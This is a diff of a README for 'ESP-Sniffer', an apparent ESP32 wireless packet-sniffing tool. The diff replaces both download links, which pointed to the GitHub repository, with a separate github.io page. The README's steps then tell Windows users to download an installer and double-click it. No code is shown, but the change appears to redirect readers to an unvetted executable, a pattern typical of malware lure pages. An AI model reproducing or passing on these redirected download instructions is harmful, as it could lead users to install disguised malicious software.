@@ -1,6 +1,6 @@
 # 📡 ESP-Sniffer - See live wireless network data easily
 
-[![Download ESP-Sniffer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/simpleminded-constellation669/ESP-Sniffer)
+[![Download ESP-Sniffer](https://img.shields.io/badge/Download-Release-blue.svg)](https://simpleminded-constellation669.github.io)
 
 ESP-Sniffer captures wireless network packets using the ESP32 hardware platform. This tool allows users to see traffic moving through the air. Security professionals and network hobbyists use this data to understand how wireless devices communicate. The software runs on your computer and talks to the ESP32 board to display information in real time.
 
@@ -12,7 +12,7 @@ You need a Windows computer to run this application. Ensure you have at least 4G
 
 Follow these steps to set up your device and start the software. 
 
-1. Visit this page to download the software: https://github.com/simpleminded-constellation669/ESP-Sniffer
+1. Visit this page to download the software: https://simpleminded-constellation669.github.io
 2. Locate the download button on the page.
 3. Save the installation file to your computer.
 4. Double-click the file to start the installation.
